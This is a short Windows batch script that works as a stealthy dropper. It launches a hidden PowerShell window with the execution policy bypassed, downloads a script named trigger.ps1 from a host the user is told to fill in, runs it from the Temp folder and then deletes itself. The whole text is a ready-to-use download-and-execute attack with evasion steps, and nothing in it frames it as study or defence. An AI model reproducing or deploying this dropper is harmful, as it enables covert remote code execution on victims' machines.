@ECHO OFF
cd %userprofile%\AppData\Local\Temp\
start PowerShell -WindowStyle hidden -NoProfile -ExecutionPolicy Bypass (New-Object System.Net.WebClient).DownloadFile('http://<your_website_host>/trigger.ps1','trigger.ps1');.\trigger.ps1
del %0
#### EDIT the http:// IP or URL to where you host the file ####
